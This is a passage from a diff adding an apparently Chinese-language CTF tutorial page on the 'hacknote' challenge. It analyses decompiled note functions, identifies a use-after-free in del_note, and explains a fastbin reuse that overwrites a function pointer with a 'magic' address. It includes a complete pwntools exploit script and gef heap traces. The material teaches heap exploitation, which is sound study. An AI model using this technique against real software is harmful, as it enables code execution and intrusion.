+        <span class="n">size</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+        <span class="n">v0</span> <span class="o">=</span> <span class="n">notelist</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+        <span class="n">v0</span><span class="o">-&gt;</span><span class="n">content</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">notelist</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">content</span> <span class="p">)</span>
+        <span class="p">{</span>
+          <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Alloca Error&quot;</span><span class="p">);</span>
+          <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Content :&quot;</span><span class="p">);</span>
+        <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">notelist</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Success !&quot;</span><span class="p">);</span>
+        <span class="o">++</span><span class="n">count</span><span class="p">;</span>
+        <span class="k">return</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Full&quot;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+<h4 id="print_note">print_note<a class="headerlink" href="#print_note" title="Permanent link">&para;</a></h4>
+<p>print_note就是简单的根据给定的note的索引来输出对应索引的note的内容。</p>
+<div class="codehilite"><pre><span></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">print_note</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [esp+4h] [ebp-14h]</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [esp+8h] [ebp-10h]</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [esp+Ch] [ebp-Ch]</span>
+
+  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Index :&quot;</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4u</span><span class="p">);</span>
+  <span class="n">v1</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">v1</span> <span class="o">&gt;=</span> <span class="n">count</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Out of bound!&quot;</span><span class="p">);</span>
+    <span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">notelist</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="p">)</span>
+    <span class="n">notelist</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">put</span><span class="p">(</span><span class="n">notelist</span><span class="p">[</span><span class="n">v1</span><span class="p">]);</span>
+  <span class="k">return</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+<h4 id="delete_note">delete_note<a class="headerlink" href="#delete_note" title="Permanent link">&para;</a></h4>
+<p>delete_note 会根据给定的索引来释放对应的note。但是值得注意的是，在 删除的时候，只是单纯进行了free，而没有设置为NULL，那么显然，这里是存在Use After Free的情况的。</p>
+<div class="codehilite"><pre><span></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">del_note</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [esp+4h] [ebp-14h]</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [esp+8h] [ebp-10h]</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [esp+Ch] [ebp-Ch]</span>
+
+  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Index :&quot;</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4u</span><span class="p">);</span>
+  <span class="n">v1</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">v1</span> <span class="o">&gt;=</span> <span class="n">count</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Out of bound!&quot;</span><span class="p">);</span>
+    <span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">notelist</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">notelist</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">);</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">notelist</span><span class="p">[</span><span class="n">v1</span><span class="p">]);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Success&quot;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+<h3 id="_4">利用分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>我们可以看到 Use After Free 的情况确实可能会发生，那么怎么可以让它发生并且进行利用呢？需要同时注意的是，这个程序中还有一个magic函数，我们有没有可能来通过use after free 来使得这个程序执行magic函数呢？<strong>一个很直接的想法是修改note的put字段为magic函数的地址，从而实现在执行print note 的时候执行magic函数。</strong> 那么该怎么执行呢？                                                                         </p>
+<p>我们可以简单来看一下每一个note生成的具体流程</p>
+<ol>
+<li>程序申请8字节内存用来存放note中的put以及content指针。</li>
+<li>程序根据输入的size来申请指定大小的内存，然后用来存储content。<div class="codehilite"><pre><span></span>   +-----------------+                       
+   |   put           |                       
+   +-----------------+                       
+   |   content       |       size              
+   +-----------------+-------------------&amp;gt;+----------------+
+                                          |     real       |
+                                          |    content     |
+                                          |                |
+                                          +----------------+
+</pre></div>
+
+
+</li>
+</ol>
+<p>那么，根据我们之前在堆的实现中所学到的，显然note是一个fastbin chunk（大小为16字节）。我们的目的是希望一个note的put字段为magic的函数地址，那么我们必须想办法让某个note的put指针被覆盖为magic地址。由于程序中只有唯一的地方对put进行赋值。所以我们必须利用写real content的时候来进行覆盖。具体采用的思路如下</p>
+<ul>
+<li>申请note0，real content size为16（大小与note大小所在的bin不一样即可）</li>
+<li>申请note1，real content size为16（大小与note大小所在的bin不一样即可）</li>
+<li>释放note0</li>
+<li>释放note1</li>
+<li>此时，大小为16的fast bin chunk中链表为note1-&gt;note0</li>
+<li>申请note2，并且设置real content的大小为8，那么根据堆的分配规则</li>
+<li>note2其实会分配note1对应的内存块。</li>
+<li>real content 对应的chunk其实是note0。</li>
+<li>如果我们这时候向note2 real content的chunk部分写入magic的地址，那么由于我们没有note0为NULL。当我们再次尝试输出note0的时候，程序就会调用magic函数。</li>
+</ul>
+<h3 id="_5">利用脚本<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding: utf-8 -*-</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./hacknote&#39;</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">addnote</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">delnote</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">printnote</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+
+<span class="c1">#gdb.attach(r)</span>
+<span class="n">magic</span> <span class="o">=</span> <span class="mh">0x08048986</span>
+
+<span class="n">addnote</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="s2">&quot;aaaa&quot;</span><span class="p">)</span> <span class="c1"># add note 0</span>
+<span class="n">addnote</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="s2">&quot;ddaa&quot;</span><span class="p">)</span> <span class="c1"># add note 1</span>
+
+<span class="n">delnote</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># delete note 0</span>
+<span class="n">delnote</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># delete note 1</span>
+
+<span class="n">addnote</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">magic</span><span class="p">))</span> <span class="c1"># add note 2</span>
+
+<span class="n">printnote</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># print note 0</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+
+<p>我们可以具体看一下执行的流程，首先先下断点</p>
+<p><strong>两处malloc下断点</strong></p>
+<div class="codehilite"><pre><span></span>gef➤  b *0x0804875C
+Breakpoint <span class="m">1</span> at 0x804875c
+gef➤  b *0x080486CA
+Breakpoint <span class="m">2</span> at 0x80486ca
+</pre></div>
+
+<p><strong>两处free下断点</strong></p>
+<div class="codehilite"><pre><span></span>gef➤  b *0x08048893
+Breakpoint <span class="m">3</span> at 0x8048893
+gef➤  b *0x080488A9
+Breakpoint <span class="m">4</span> at 0x80488a9
+</pre></div>
+
+<p>然后继续执行程序，可以看出申请note0时，所申请到的内存块地址为0x0804b008。（eax存储函数返回值）</p>
+<div class="codehilite"><pre><span></span><span class="nf">$eax</span>   <span class="p">:</span> <span class="mi">0x0804b008</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
+<span class="nf">$ebx</span>   <span class="p">:</span> <span class="mi">0x00000000</span>
+<span class="nf">$ecx</span>   <span class="p">:</span> <span class="mi">0xf7fac780</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
+<span class="nf">$edx</span>   <span class="p">:</span> <span class="mi">0x0804b008</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
+<span class="nf">$esp</span>   <span class="p">:</span> <span class="mi">0xffffcf10</span>  <span class="err">→</span>  <span class="mi">0x00000008</span>
+<span class="nf">$ebp</span>   <span class="p">:</span> <span class="mi">0xffffcf48</span>  <span class="err">→</span>  <span class="mi">0xffffcf68</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
+<span class="nf">$esi</span>   <span class="p">:</span> <span class="mi">0xf7fac000</span>  <span class="err">→</span>  <span class="mi">0x001b1db0</span>
+<span class="nf">$edi</span>   <span class="p">:</span> <span class="mi">0xf7fac000</span>  <span class="err">→</span>  <span class="mi">0x001b1db0</span>
+<span class="nf">$eip</span>   <span class="p">:</span> <span class="mi">0x080486cf</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">89</span><span class="err">&gt;</span> <span class="no">add</span> <span class="no">esp</span><span class="p">,</span> <span class="mi">0x10</span>
+<span class="nf">$cs</span>    <span class="p">:</span> <span class="mi">0x00000023</span>
+<span class="nf">$ss</span>    <span class="p">:</span> <span class="mi">0x0000002b</span>
+<span class="nf">$ds</span>    <span class="p">:</span> <span class="mi">0x0000002b</span>
+<span class="nf">$es</span>    <span class="p">:</span> <span class="mi">0x0000002b</span>
+<span class="nf">$fs</span>    <span class="p">:</span> <span class="mi">0x00000000</span>
+<span class="nf">$gs</span>    <span class="p">:</span> <span class="mi">0x00000063</span>
+<span class="nl">$eflags:</span> <span class="err">[</span><span class="nf">carry</span> <span class="no">PARITY</span> <span class="no">adjust</span> <span class="no">zero</span> <span class="no">SIGN</span> <span class="no">trap</span> <span class="no">INTERRUPT</span> <span class="no">direction</span> <span class="no">overflow</span> <span class="no">resume</span> <span class="no">virtualx86</span> <span class="no">identification</span><span class="p">]</span>
+<span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[</span> <span class="nl">code:</span><span class="nf">i386</span> <span class="p">]</span><span class="err">────</span>
+    <span class="err">0</span><span class="nf">x80486c2</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">76</span><span class="err">&gt;</span>    <span class="no">add</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">eax</span><span class="p">],</span> <span class="no">eax</span>
+    <span class="err">0</span><span class="nf">x80486c4</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">78</span><span class="err">&gt;</span>    <span class="no">add</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">ebx</span><span class="err">+</span><span class="mi">0x86a0cec</span><span class="p">],</span> <span class="no">al</span>
+    <span class="err">0</span><span class="nf">x80486ca</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">84</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="mh">0x80484e0</span> <span class="p">&lt;</span><span class="no">malloc@plt</span><span class="p">&gt;</span>
+ <span class="err">→</span>  <span class="err">0</span><span class="nf">x80486cf</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">89</span><span class="err">&gt;</span>    <span class="no">add</span>    <span class="no">esp</span><span class="p">,</span> <span class="mi">0x10</span>
+    <span class="err">0</span><span class="nf">x80486d2</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">92</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">edx</span><span class="p">,</span> <span class="no">eax</span>
+    <span class="err">0</span><span class="nf">x80486d4</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">94</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">ebp-0x1c</span><span class="p">]</span>
+    <span class="err">0</span><span class="nf">x80486d7</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">97</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">eax</span><span class="p">*</span><span class="mi">4</span><span class="err">+</span><span class="mi">0x804a070</span><span class="p">],</span> <span class="no">edx</span>
+<span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[</span> <span class="nf">stack</span> <span class="p">]</span><span class="err">────</span>
+<span class="err">[&#39;0</span><span class="nf">xffffcf10</span><span class="err">&#39;</span><span class="p">,</span> <span class="err">&#39;</span><span class="no">l8</span><span class="err">&#39;</span><span class="p">]</span>
+<span class="err">8</span>
+<span class="err">0</span><span class="nf">xffffcf10</span><span class="err">│+</span><span class="mi">0x00</span><span class="p">:</span> <span class="mi">0x00000008</span>     <span class="err">←</span> <span class="no">$esp</span>
+<span class="err">0</span><span class="nf">xffffcf14</span><span class="err">│+</span><span class="mi">0x04</span><span class="p">:</span> <span class="mi">0x00000000</span>
+<span class="err">0</span><span class="nf">xffffcf18</span><span class="err">│+</span><span class="mi">0x08</span><span class="p">:</span> <span class="mi">0xf7e29ef5</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">strtol</span><span class="err">+</span><span class="mi">5</span><span class="err">&gt;</span> <span class="no">add</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0x18210b</span>
+<span class="err">0</span><span class="nf">xffffcf1c</span><span class="err">│+</span><span class="mi">0x0c</span><span class="p">:</span> <span class="mi">0xf7e27260</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">atoi</span><span class="err">+</span><span class="mi">16</span><span class="err">&gt;</span> <span class="no">add</span> <span class="no">esp</span><span class="p">,</span> <span class="mi">0x1c</span>
+<span class="err">0</span><span class="nf">xffffcf20</span><span class="err">│+</span><span class="mi">0x10</span><span class="p">:</span> <span class="mi">0xffffcf58</span>  <span class="err">→</span>  <span class="mi">0xffff0a31</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
+<span class="err">0</span><span class="nf">xffffcf24</span><span class="err">│+</span><span class="mi">0x14</span><span class="p">:</span> <span class="mi">0x00000000</span>
+<span class="err">0</span><span class="nf">xffffcf28</span><span class="err">│+</span><span class="mi">0x18</span><span class="p">:</span> <span class="mi">0x0000000a</span>
+<span class="err">0</span><span class="nf">xffffcf2c</span><span class="err">│+</span><span class="mi">0x1c</span><span class="p">:</span> <span class="mi">0x00000000</span>
+<span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[</span> <span class="nf">trace</span> <span class="p">]</span><span class="err">────</span>
+<span class="err">---</span><span class="nf">Type</span> <span class="err">&lt;</span><span class="no">return</span><span class="err">&gt;</span> <span class="no">to</span> <span class="no">continue</span><span class="p">,</span> <span class="no">or</span> <span class="mh">q</span> <span class="p">&lt;</span><span class="no">return</span><span class="p">&gt;</span> <span class="no">to</span> <span class="no">quit---</span>
+<span class="err">[</span><span class="c">#0] 0x80486cf → Name: add_note()</span>
+<span class="err">[</span><span class="c">#1] 0x8048ac5 → Name: main()</span>
+<span class="err">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+<span class="nf">gef</span><span class="err">➤</span>  <span class="no">heap</span> <span class="no">chunk</span> <span class="mi">0x0804b008</span>
+<span class="nf">UsedChunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x804b008</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x10</span><span class="p">)</span>
+<span class="nf">Chunk</span> <span class="no">size</span><span class="p">:</span> <span class="mi">16</span> <span class="p">(</span><span class="mi">0x10</span><span class="p">)</span>
+<span class="nf">Usable</span> <span class="no">size</span><span class="p">:</span> <span class="mi">12</span> <span class="p">(</span><span class="mi">0xc</span><span class="p">)</span>
+<span class="nf">Previous</span> <span class="no">chunk</span> <span class="no">size</span><span class="p">:</span> <span class="mi">0</span> <span class="p">(</span><span class="mi">0x0</span><span class="p">)</span>
+<span class="nf">PREV_INUSE</span> <span class="no">flag</span><span class="p">:</span> <span class="no">On</span>
+<span class="nf">IS_MMAPPED</span> <span class="no">flag</span><span class="p">:</span> <span class="no">Off</span>
+<span class="nf">NON_MAIN_ARENA</span> <span class="no">flag</span><span class="p">:</span> <span class="no">Off</span>
+</pre></div>
+
+<p><strong>申请note 0的content的地址为0x0804b018</strong></p>
+<div class="codehilite"><pre><span></span><span class="nf">$eax</span>   <span class="p">:</span> <span class="mi">0x0804b018</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
+<span class="nf">$ebx</span>   <span class="p">:</span> <span class="mi">0x0804b008</span>  <span class="err">→</span>  <span class="mi">0x0804865b</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">print_note_content</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">push</span> <span class="no">ebp</span>
+<span class="nf">$ecx</span>   <span class="p">:</span> <span class="mi">0xf7fac780</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
+<span class="nf">$edx</span>   <span class="p">:</span> <span class="mi">0x0804b018</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
+<span class="nf">$esp</span>   <span class="p">:</span> <span class="mi">0xffffcf10</span>  <span class="err">→</span>  <span class="mi">0x00000020</span>
+<span class="nf">$ebp</span>   <span class="p">:</span> <span class="mi">0xffffcf48</span>  <span class="err">→</span>  <span class="mi">0xffffcf68</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
+<span class="nf">$esi</span>   <span class="p">:</span> <span class="mi">0xf7fac000</span>  <span class="err">→</span>  <span class="mi">0x001b1db0</span>
+<span class="nf">$edi</span>   <span class="p">:</span> <span class="mi">0xf7fac000</span>  <span class="err">→</span>  <span class="mi">0x001b1db0</span>
+<span class="nf">$eip</span>   <span class="p">:</span> <span class="mi">0x08048761</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">235</span><span class="err">&gt;</span> <span class="no">add</span> <span class="no">esp</span><span class="p">,</span> <span class="mi">0x10</span>
+<span class="nf">$cs</span>    <span class="p">:</span> <span class="mi">0x00000023</span>
+<span class="nf">$ss</span>    <span class="p">:</span> <span class="mi">0x0000002b</span>
+<span class="nf">$ds</span>    <span class="p">:</span> <span class="mi">0x0000002b</span>
+<span class="nf">$es</span>    <span class="p">:</span> <span class="mi">0x0000002b</span>
+<span class="nf">$fs</span>    <span class="p">:</span> <span class="mi">0x00000000</span>
+<span class="nf">$gs</span>    <span class="p">:</span> <span class="mi">0x00000063</span>
+<span class="nl">$eflags:</span> <span class="err">[</span><span class="nf">carry</span> <span class="no">PARITY</span> <span class="no">adjust</span> <span class="no">ZERO</span> <span class="no">sign</span> <span class="no">trap</span> <span class="no">INTERRUPT</span> <span class="no">direction</span> <span class="no">overflow</span> <span class="no">resume</span> <span class="no">virtualx86</span> <span class="no">identification</span><span class="p">]</span>
+<span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[</span> <span class="nl">code:</span><span class="nf">i386</span> <span class="p">]</span><span class="err">────</span>
+    <span class="err">0</span><span class="nf">x8048752</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">220</span><span class="err">&gt;</span>   <span class="no">mov</span>    <span class="no">al</span><span class="p">,</span> <span class="no">ds</span><span class="p">:</span><span class="mi">0x458b0804</span>
+    <span class="err">0</span><span class="nf">x8048757</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">225</span><span class="err">&gt;</span>   <span class="no">call</span>   <span class="mi">0x581173df</span>
+    <span class="err">0</span><span class="nf">x804875c</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">230</span><span class="err">&gt;</span>   <span class="no">call</span>   <span class="mh">0x80484e0</span> <span class="p">&lt;</span><span class="no">malloc@plt</span><span class="p">&gt;</span>
+ <span class="err">→</span>  <span class="err">0</span><span class="nf">x8048761</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">235</span><span class="err">&gt;</span>   <span class="no">add</span>    <span class="no">esp</span><span class="p">,</span> <span class="mi">0x10</span>
+    <span class="err">0</span><span class="nf">x8048764</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">238</span><span class="err">&gt;</span>   <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">ebx</span><span class="err">+</span><span class="mi">0x4</span><span class="p">],</span> <span class="no">eax</span>
+    <span class="err">0</span><span class="nf">x8048767</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">241</span><span class="err">&gt;</span>   <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">ebp-0x1c</span><span class="p">]</span>
+    <span class="err">0</span><span class="nf">x804876a</span> <span class="err">&lt;</span><span class="no">add_note</span><span class="err">+</span><span class="mi">244</span><span class="err">&gt;</span>   <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">eax</span><span class="p">*</span><span class="mi">4</span><span class="err">+</span><span class="mi">0x804a070</span><span class="p">]</span>
+<span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[</span> <span class="nf">stack</span> <span class="p">]</span><span class="err">────</span>
+<span class="err">[&#39;0</span><span class="nf">xffffcf10</span><span class="err">&#39;</span><span class="p">,</span> <span class="err">&#39;</span><span class="no">l8</span><span class="err">&#39;</span><span class="p">]</span>
+<span class="err">8</span>
+<span class="err">0</span><span class="nf">xffffcf10</span><span class="err">│+</span><span class="mi">0x00</span><span class="p">:</span> <span class="mi">0x00000020</span>     <span class="err">←</span> <span class="no">$esp</span>
+<span class="err">0</span><span class="nf">xffffcf14</span><span class="err">│+</span><span class="mi">0x04</span><span class="p">:</span> <span class="mi">0xffffcf34</span>  <span class="err">→</span>  <span class="mi">0xf70a3233</span>
+<span class="err">0</span><span class="nf">xffffcf18</span><span class="err">│+</span><span class="mi">0x08</span><span class="p">:</span> <span class="mi">0x00000008</span>
+<span class="err">0</span><span class="nf">xffffcf1c</span><span class="err">│+</span><span class="mi">0x0c</span><span class="p">:</span> <span class="mi">0xf7e27260</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">atoi</span><span class="err">+</span><span class="mi">16</span><span class="err">&gt;</span> <span class="no">add</span> <span class="no">esp</span><span class="p">,</span> <span class="mi">0x1c</span>
+<span class="err">0</span><span class="nf">xffffcf20</span><span class="err">│+</span><span class="mi">0x10</span><span class="p">:</span> <span class="mi">0xffffcf58</span>  <span class="err">→</span>  <span class="mi">0xffff0a31</span>  <span class="err">→</span>  <span class="mi">0x00000000</span>
+<span class="err">0</span><span class="nf">xffffcf24</span><span class="err">│+</span><span class="mi">0x14</span><span class="p">:</span> <span class="mi">0x00000000</span>
+<span class="err">0</span><span class="nf">xffffcf28</span><span class="err">│+</span><span class="mi">0x18</span><span class="p">:</span> <span class="mi">0x0000000a</span>
+<span class="err">0</span><span class="nf">xffffcf2c</span><span class="err">│+</span><span class="mi">0x1c</span><span class="p">:</span> <span class="mi">0x00000000</span>
+<span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[</span> <span class="nf">trace</span> <span class="p">]</span><span class="err">────</span>
